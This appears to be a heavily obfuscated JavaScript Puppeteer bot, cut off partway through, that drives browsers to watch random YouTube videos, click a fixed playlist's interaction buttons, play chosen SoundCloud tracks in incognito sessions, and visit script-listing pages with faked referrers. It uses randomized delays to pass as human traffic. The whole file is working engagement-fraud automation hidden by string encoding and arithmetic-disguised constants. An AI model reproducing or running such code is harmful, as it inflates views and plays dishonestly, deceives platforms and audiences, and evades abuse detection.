const Y = b,
  X = d,
  W = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xdb4 + 0x10af + -0x2fa))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1590 + -0xb3 * -0x5 + -0x7d * -0x25), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * -0x812 + -0x1f * 0x140 + 0x1b * 0x57a + (-0x260d + -0x7 * -0x5d9 + 0x37b6) * random()) : await standardWaitForNetIdle(f), await wait(-0x2c4 * 0x6 + 0x2484 * -0x1 + 0x48a4 + (-0x45cb * 0x1 + -0x2eba + -0x1 * -0x9b95) * random()), 0xc69 + -0x49e + -0x7ca;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x815 + -0x18a9 + 0x1094);
    let h = e[f];
    if (c['prxdtp'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xa0 * -0x2b + -0x4d3 + -0x469 * 0x5, r, s, t = -0x5d1 * -0x2 + -0x332 * 0x2 + -0x53e; s = m['charAt'](t++); ~s && (r = q % (0x10af + -0x3cc + -0xcdf) ? r * (-0xb3 * -0x5 + -0x41b * 0x5 + -0x4 * -0x452) + s : s, q++ % (-0x11 * -0x1af + 0x16 * -0x27 + -0x1941)) ? o += String['fromCharCode'](-0x7 * -0x1f3 + -0x1b5d + 0xeb7 & r >> (-(-0x2484 + 0x431 * 0x1 + 0x2055) * q & -0x1173 * 0x2 + -0x175d + -0x2b * -0x15b)) : 0xc69 + -0x49e + -0x7cb) {
          s = n['indexOf'](s);
        }
        for (let u = -0x166b + 0x7dc * -0x1 + -0x1e47 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x21 * -0x1 + -0xa3b + 0x17 * 0x74))['slice'](-(-0x13f6 + -0x2 * 0x648 + 0x2088));
        }
        return decodeURIComponent(p);
      };
      c['TVIsxw'] = i, b = arguments, c['prxdtp'] = !![];
    }
    const j = e[0x2b3 + -0x12 * 0x16 + -0x127 * 0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['TVIsxw'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x166b + 0x7dc * -0x1 + -0x31cf * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x21 * -0x1 + -0xa3b + 0x7 * 0x17b;
}

function a() {
  const bk = [
    'lither-io-',
    'WQtdQNVdTSktW4JcQNRdNxO',
    'y3j5ChrV',
    'moo.io\x20hac',
    'DY55B3v0DwjLlG',
    'i1TNW5aMxhCyfZ0',
    'easyfork.o',
    'ESkpWOxcPZNcUW',
    'BgvUz3rO',
    'WOyUys9YWR/dI8oDsSoA',
    'B29TB28UAw9FuG',
    'WO5UW7i1W67cSsavW7RdHq',
    'pts/by-sit',
    'CMaLrHpcTCodcSk/WOe',
    'W5xcLxKUvhrno8oCW5i',
    'jCoxWQi1jmkuWQmigmk0',
    'WOVcOZK3WPXnWQ9jfSoY',
    'calm-down-',
    'y2hcHtzRW4eFWOetyW',
    'ChrZlZq1nJG1nq',
    'WRvHW4ddML5WWPDaWQGm',
    'BSkEwaVdHtixW7DwWQe',
    'z0TNrMLfz2DOEq',
    'zw52'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function randomWait() {
  return await wait(-0x13f6 + -0x2 * 0x648 + 0x340e + (0x2b3 + -0x12 * 0x16 + -0x1261 * -0x1) * random()), -0x20e7 + -0x1b43 * 0x1 + 0x3c2b;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * -0x383 + 0x1ac1 + 0xb9f * -0x2, 0x6d * -0x2b + 0x110b + 0x14b * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x7d3c + 0x1884f + -0x3fd * 0x47) * getRandomInt(-0x1f90 + -0x3 * -0x7aa + -0x12 * -0x7a, 0x577 * 0x4 + 0x672 + -0x1c49), h)), -0x1 * -0x19da + -0xb74 + 0xb * -0x14f;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x815 + -0x18a9 + 0x1094);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x6d * -0x59 + -0xe04 + -0x17e1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1191 + -0x3e * 0x90 + 0x1150]['split']('\x20');
    for (let k = 0x1 * 0x1cfa + 0x1aca + -0xac * 0x53; k < i['length']; k += -0x2 * 0x3a9 + 0xc63 + -0x23 * 0x25)
      j += i[k] * h[i[k + (-0x2047 + -0x3 * 0x453 + -0x14b * -0x23)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x15d * -0xf + 0x18e6 + -0x46d)['map'](l => Array['from'](l['children']))['flat'](-0x186e + -0x1f15 + 0x2 * 0x1bc2)['map'](l => l['childNodes'][0x1841 + 0xe * -0xdd + 0x6 * -0x207]['childNodes'][0x1 * -0x1fe3 + 0x6 * 0xaa + -0x1be7 * -0x1]['childNodes'][0x3ba * 0x8 + -0x71 + 0x15 * -0x166]['childNodes'][0x249 * -0xd + -0x1f * 0xd7 + 0x593 * 0xa]['childNodes'][0x405 + 0x4e6 + -0x8ea]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', R(0x10, 'Omsg') + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1761 + 0x21d5 * -0x1 + 0xe5c, 0x1eee + -0xb13 + -0x53)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x56c6 + -0x38bb * 0x1 + 0xca19);
  const h = await getMaxTime(f),
    i = Math['min']((-0x6 * -0x1b03 + -0x80da * 0x3 + -0xc * -0x263d) * getRandomInt(-0x1a * -0xa3 + -0x68c + 0x5 * -0x200, 0x1dfb * -0x1 + -0xf52 + 0x2d52), h);
  return await wait(i), -0x69 * -0x5d + 0x1a9f + -0x3b * 0x119;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xd * 0xf1 + 0x1ad1 + -0x270e]['children'][-0x1 * 0x3ef + 0x6cb + -0x2dc]['children'][-0x5cb * -0x1 + -0xcc + -0x4ff]['children'][-0x8e * 0x2 + 0x1a47 + -0x192b]['children'][-0x28a + -0x1468 + 0x16f2]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x11a * -0x13 + 0x305 * 0x5 + 0x5d6;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x178f + 0x1296 + -0x29c1 + (0x1733 + -0xe * 0xd0 + 0xba1 * -0x1) * random()
  }), await wait(0xd5 * -0x2b + 0x651 + 0x1f6a + (-0x6a2 * -0x1 + 0x4e + -0xc * 0x7b) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x13ed * -0x1 + 0x1b5b + -0x76c]['childNodes'][0xf * -0x132 + 0x355 * -0x5 + -0x8 * -0x453]['childNodes'][-0xe5d + 0x9cb + -0x493 * -0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1071 * 0x2 + 0x11 * 0x159 + -0x1 * -0x9fe]['childNodes'][0x1182 + 0x7a1 + -0xc3 * 0x21]['childNodes'][0x1845 + -0x12 * -0x17 + -0x19e1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x20f3 + 0x23ea + -0x44dc),
          r = -0xfbd + 0x89d + 0x720;
        for (let u = 0x250f + -0x1ff1 + -0x51e * 0x1; u < q['length']; u += -0x244e + -0x2525 + 0x4975)
          r += q[u] * k[q[u + (0x1 * -0x4cd + 0x1041 + -0xb73)]];
        return r;
      }(n);
  });
  await wait((0x657d * 0x1 + 0x7 * -0x102e + 0x465d) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xdfa4 + 0x16c * 0x12b + -0x20e0 * -0x1) * getRandomInt(0xe4 * -0x3 + 0x15ec + -0x133f, -0x31f * -0x3 + 0x3a2 + 0xcf5 * -0x1), h + (0xbaa + -0x1 * -0x10cb + 0x5 * -0x1c9));
  return await wait(i), -0x1055 + -0x955 + -0x1 * -0x19ab;
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1d7d + -0x3 * 0x923 + -0x85 * 0x4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + S(0x1, 'eiV[') + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xd0d + 0xfa1 * -0x1 + -0x1433 * -0x2 + (-0xd6e + -0x13 * -0xd5 + 0x187) * Math['random']());
    });
  }, 0x1c88 + -0x354a + 0x341a);
  await wait(-0x5d9d6 + -0x84bd * -0x1 + 0x9e8f9);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xf4a8 + 0x38b3 * -0x5 + 0x11137 * 0x1) * getRandomInt(-0x2499 + 0x244d + 0x1 * 0x50, 0x1 * 0x16b7 + -0x1 * 0x2557 + 0x1 * 0xeb9)), clearInterval(h), -0x327 * 0x9 + -0xe77 * -0x2 + -0x8e;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1501 + -0x1f7b + 0xa7a;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x20a4 * 0x1 + -0x1cc3 + 0x1f * -0x20;
    await randomWait();
  }
  return -0x1 * 0x1924 + -0x1907 + 0x2 * 0x1916;
}

function fetchRandomSC() {
  return Math['random']() <= 0xe * 0x76 + -0x1b8f + 0x709 * 0x3 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x28 * 0x95 + -0xe80 + 0x2 * -0x464 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x3 * -0x905 + 0x9d2 + -0x24e1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1 * 0x1ea1 + 0xc7f + 0x1222;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xd8ee + 0xdb35 + -0x1045b + getRandomInt(-0x1736 + -0x18b5 * 0x1 + 0x1bf * 0x3d, -0xbeee + -0x4f * 0x28e + 0x1fdf0));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x217 * 0x6 + 0x1 * 0x28d + 0x9fe), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0xb7 * -0x15 + -0x137a + 0x227d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1ca6 + -0x719 + -0x158d, 0x2ff + -0x2 * 0x10c6 + 0x1ebf)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xff0 + -0x25aa + 0x1d8a + floor((0xc0b * -0x1 + 0x3d3 * 0x9 + -0x1278) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x28c51cde + 0x2801506a + 0x2f3992b8),
          -0x35 * 0x3448c + -0x1 * 0x30536a + 0x15d8466,
          0x1 * -0x5043 + 0x56d5 + 0x796e,
          -0x414 + -0x9 * -0x45 + 0x227
        ], y = [
          0x1 * 0x1a11 + 0x175e + 0x11 * -0x2e7,
          0x42b * -0x1 + -0x20f6 * 0x1 + 0x2531,
          -0x3 * 0xc1 + 0x1 * 0x43e + -0x1f3,
          0x1d3a + 0x2658 + -0x4392
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1 * 0x2393 + -0xde3 + -0x107d * -0x3)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x23 * -0xb7 + 0x23 * 0xd4 + -0x3601; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('const T = c;require(T(2));'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x83d * -0x3 + 0xd * 0x71 + -0x1e74) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x250 + 0xd2e + -0xd6 * 0xd] = A[-0x27 * 0x1 + -0x12b6 + 0x12ed] = A[0xced * 0x1 + -0x2550 + 0x1be * 0xe] = A[0x1e8c + -0x50c + -0x197e] = A[-0x217f + -0x419 * 0x7 + 0x3e31] = A[-0xe9 * -0x19 + -0x1 * -0x25bf + -0x3c7c] = A[0x1 * 0x1fdf + -0x36f * 0x2 + -0x29 * 0x9c] = A[-0x12fd + -0x1a3 * 0x4 + -0x1 * -0x198f] = A[0x476 * -0x7 + -0x142 * -0x4 + 0x1a39] = A[-0x209a + 0x7f7 + 0x18ab] = A[-0x7 * -0x449 + -0x163c + -0x7ba] = A[0x2473 * -0x1 + 0x1fe + 0x1 * 0x227f] = A[-0x216d + -0x31d * -0x1 + 0x199 * 0x13] = A[-0x100d * -0x2 + 0x7ac + -0x13dd * 0x2] = A[-0x13f5 + -0x2f4 + 0x16f6] = A[0x528 + 0x2677 + -0x2b91 * 0x1] = A[0xf * -0x185 + 0x89f * -0x1 + 0x1f79] = -0x22d3 * 0x1 + -0x2216 + 0x44e9, this['blocks'] = A) : this['blocks'] = [
                -0x11 * 0x215 + -0xb9 + 0x241e,
                -0xc05 + -0x1 * 0x163a + 0x223f * 0x1,
                0x19df + -0xcf0 + -0xcef,
                0x1770 + -0x2 * 0xa16 + 0x4c * -0xb,
                0x1332 + -0x1 * 0x8ad + 0x1 * -0xa85,
                -0x1959 + -0x8 * -0x161 + 0xe51,
                0x452 * 0x9 + -0x95 * -0x37 + 0x1 * -0x46e5,
                0x1 * 0x161b + -0x6 * -0x170 + -0x1ebb * 0x1,
                0x22ba + -0xcff + -0x15bb,
                -0xcdd + -0x8ff * -0x1 + 0x3de,
                0x15fd + 0x1e80 + -0x5d5 * 0x9,
                0x4 * -0x1ff + 0x1 * -0x11d7 + -0x259 * -0xb,
                -0x2 * 0x12df + -0x1a18 + 0x1 * 0x3fd6,
                0x1a18 + -0x3b * -0x76 + -0x354a,
                0x6ec + 0xaf + -0x79b,
                -0x1337 * 0x1 + -0x1 * 0x992 + 0x1cc9,
                0xf * -0x1cf + 0x134f * 0x1 + 0x7d2
              ], this['h0'] = 0x2f095b * 0xbb + 0xd570568 + 0x37924820, this['h1'] = 0xd86 * -0xcd06d + -0x19c3a3718 + 0x3395284af, this['h2'] = 0x5d73f7cf + 0xc9a9a5ee + -0xa09375 * 0xe3, this['h3'] = -0x18ff4638 + 0x13151d8f * 0x1 + 0x161c7d1f, this['h4'] = 0x1876e457a + 0xe7c64057 + -0x1ab61a3e1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xf39 + 0x22f9 + 0x20 * -0x9e, this['finalized'] = this['hashed'] = 0x2a * 0x27 + -0x4a * 0x2c + 0x652, this['first'] = 0x1d * 0x17 + 0x51 * -0x69 + 0xc9 * 0x27;
            }
            ['update'](J) {
              const V = b,
                U = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x195a + 0x3c2 * -0x4 + 0xd76 * 0x3, O = J[U(0x8)] || -0x3dc * 0x1 + -0x1532 + 0x6 * 0x42d, P = this[V(0x7, 'ZsuQ')]; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * -0x2bd + 0x3eb + 0x2 * -0x354, P[0x287 * -0x7 + -0x181f + 0x29d0] = this['block'], P[-0xb99 + 0xd * 0x3f + 0x876 * 0x1] = P[-0xa9c * -0x1 + -0x714 + -0x387] = P[-0x976 * -0x4 + 0x2 * -0x68c + -0x18be] = P[-0x1 * -0x2ac + -0x2b5 + 0x4 * 0x3] = P[0x14dd + -0x228 * 0xd + -0x72f * -0x1] = P[0x12f * -0x10 + -0x3f1 + 0x16e6] = P[-0x2011 + -0x1156 + 0x316d] = P[0x1a7 * -0x5 + 0x9b * -0x35 + 0x2861] = P[-0x1 * -0x20e7 + -0x540 * -0x6 + -0x405f] = P[-0x102d + 0xb9 * 0x12 + 0x334] = P[0x1145 + 0x2 * -0x9cb + -0x25b * -0x1] = P[-0x20c5 + 0xaff + -0x45d * -0x5] = P[-0x3 * 0x50d + 0x1e0 + 0xd53] = P[0x2159 + -0x1fd5 + 0x5 * -0x4b] = P[0x9 * 0x41b + 0x2447 + -0x492c] = P[-0x2 * 0xff1 + -0xa3 * 0x37 + 0x42f6] = 0x52a + 0x1e0f + -0x47 * 0x7f), K) {
                    for (N = this['start']; M < O && N < 0x128c + 0x1708 + -0x14aa * 0x2; ++M)
                      P[N >> 0x1 * -0x19fe + -0x269b + -0x1589 * -0x3] |= J[M] << y[-0x135d * 0x1 + -0xcc3 + 0x13 * 0x1b1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x11 * -0xab + -0x127f + 0x56 * 0x16; ++M)
                      (L = J['charCodeAt'](M)) < -0x5 * -0x613 + 0x1 * -0x24e9 + -0x385 * -0x2 ? P[N >> 0x11e1 + -0x1ec9 + 0xcea] |= L << y[-0x14df + -0x1ded + 0x32cf * 0x1 & N++] : L < 0xd4e + -0xb * 0x114 + 0x68e ? (P[N >> -0x504 + -0x23f1 + -0x28f7 * -0x1] |= (-0x144c + 0x2cf * -0xb + 0x33f1 | L >> 0x1842 + 0x9 * -0x43d + 0xde9) << y[0x1 * -0x19d8 + -0x20ca + 0x3aa5 & N++], P[N >> -0x2ed * -0x7 + -0x20 * -0x115 + -0x3719] |= (0x1999 + 0x17cb + 0x1c * -0x1bf | -0x566 * 0x1 + 0x112 * -0x1 + 0x6b7 & L) << y[-0x1885 + -0xb29 * -0x2 + 0x236 * 0x1 & N++]) : L < 0x15 * 0x12b9 + 0x6bb * -0x40 + 0x1 * 0xfd93 || L >= 0x6b20 + -0x3 * 0x6999 + -0x679 * -0x43 ? (P[N >> -0x1a6d + -0x26c8 + 0x4137] |= (-0x1 * -0x13d6 + 0x7cf + -0x7 * 0x3d3 | L >> -0x11b1 + -0xb3 * -0xd + 0x8a6) << y[-0x1 * -0x907 + -0x1089 + 0x785 & N++], P[N >> 0x18c3 + -0x1985 + 0xc4] |= (-0x131d * 0x1 + 0x1 * 0x1e55 + -0xab8 | L >> -0xc * -0x236 + -0x5 * -0x4a4 + -0x31b6 & 0x1523 + 0x157 * -0x17 + 0x9ed) << y[0x1ed * 0xc + -0x4eb * -0x2 + -0x1 * 0x20ef & N++], P[N >> 0x5a * 0x66 + 0x1fb + -0x791 * 0x5] |= (0x1daf + 0x13 * 0xb + -0x100 * 0x1e | -0x2 * 0x132d + 0x1a82 + 0x5 * 0x26b & L) << y[-0x1 * 0x1ad5 + 0x1b31 + -0x59 & N++]) : (L = -0x8 * -0x373b + -0x16748 + 0xad70 + ((-0x9f + -0x29c * -0x8 + -0x1042 & L) << -0x2 * -0xf67 + -0x1228 + -0xc9c | 0x232 * -0x1 + 0x579 + 0xb8 & J['charCodeAt'](++M)), P[N >> 0x1c73 + 0x21cc + -0x71 * 0x8d] |= (-0x1 * -0xa45 + -0x19ca + 0x1075 | L >> 0x104 * 0xa + 0xc50 + 0x3d * -0x5e) << y[-0x5 * -0x373 + -0x1547 * -0x1 + 0x2683 * -0x1 & N++], P[N >> 0xc6f * -0x2 + 0x1 * 0xd62 + 0xb7e] |= (0x5 * -0x245 + -0x21da + 0x2db3 | L >> -0x1e98 + 0x2655 + 0x7b1 * -0x1 & -0xd03 * 0x1 + 0x3 * 0x135 + 0x1 * 0x9a3) << y[-0x1 * 0xb8d + -0x1f21 * -0x1 + -0x1391 & N++], P[N >> -0x3 * -0x9d2 + 0xca * -0x1 + -0x3 * 0x98e] |= (0x1358 + -0x607 + 0x1 * -0xcd1 | L >> -0x2 * -0x1e2 + 0x2 * 0xbe1 + -0x1b80 & 0x1b08 + -0x1fd * 0x8 + -0xae1) << y[-0x1a34 + 0x1f * 0x63 + -0x4be * -0x3 & N++], P[N >> 0x1d94 + 0x3 * -0x56b + 0x1 * -0xd51] |= (0x3 * 0x1f + 0x3e4 + 0x3c1 * -0x1 | -0x10fd * 0x1 + 0x231c + -0x23c * 0x8 & L) << y[-0x806 + 0x2272 + -0x1 * 0x1a69 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x2303 + -0x1f1c + -0x3a7 ? (this['block'] = P[-0x9db + 0x3 * -0x3dd + -0xac1 * -0x2], this['start'] = N - (-0x1cd * -0x7 + 0x212e + -0x2d89 * 0x1), this['hash'](), this['hashed'] = 0x1bad + -0x26db + 0xb2f) : this['start'] = N;
                }
                return this['bytes'] > -0x1 * 0x1295927e7 + 0x2 * 0x22a50364 + 0x1e40f211e && (this['hBytes'] += this['bytes'] / (-0x14c * 0xa748d2 + 0x18 * 0x119e2301 + 0x321f2840) << 0x1d * 0x3 + -0x1 * -0x125b + -0x2 * 0x959, this['bytes'] = this['bytes'] % (0x17450c878 + 0x15a74ec84 + -0x1cec5b4fc)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x13b1 * -0x1 + 0x1 * -0x26bd + -0x1 * -0x130d;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
